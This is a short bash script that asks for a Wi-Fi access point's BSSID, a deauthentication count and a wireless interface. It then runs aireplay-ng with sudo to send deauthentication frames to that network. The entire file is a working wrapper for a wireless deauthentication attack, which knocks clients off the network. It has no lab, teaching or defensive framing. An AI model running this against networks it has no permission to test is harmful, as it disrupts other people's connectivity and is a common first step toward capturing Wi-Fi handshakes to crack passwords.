#!/bin/bash

echo -e "Enter the \033[31mBssid\033[0m:"
read bssid
echo -e "Enter the \033[31mdeauth\033[0m Value:"
read deauth
echo -e "Enter the \033[31minterface\033[0m:"
read interface
echo "-------------------------------------------" 
echo -e "\033[35mBssid\033[0m: ${bssid}"
echo -e "\033[35mDeauth value\033[0m: ${deauth}"
echo -e "\033[35minterface\033[0m: ${interface}"
sudo aireplay-ng --deauth "${deauth}" -a "${bssid}" "${interface}"
